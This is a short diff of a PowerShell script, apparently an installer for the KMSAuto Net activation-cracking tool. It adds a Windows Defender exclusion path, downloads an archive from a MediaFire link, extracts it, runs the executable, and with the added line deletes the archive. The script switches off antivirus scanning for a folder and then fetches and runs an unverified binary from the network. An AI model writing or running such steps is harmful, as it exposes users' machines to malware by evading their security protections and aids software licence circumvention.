@@ -433,6 +433,7 @@ Add-MpPreference -ExclusionPath "C:\ProgramData\KMSAutoS"
 mkdir "C:\ProgramData\KMSAutoS" -Force | Out-Null
 Start-BitsTransfer -Source "https://download1083.mediafire.com/j0ihypa1h3sg/q246c4lmhyf29ap/KMSAuto+Net.7z" -Destination "C:\ProgramData\KMSAutoS"
 7z x "KMSAuto+Net.7z" -r;
+Remove-Item "KMSAuto+Net.7z"
 Start-Process "C:\ProgramData\KMSAutoS\KMSAuto Net.exe"
 
 #
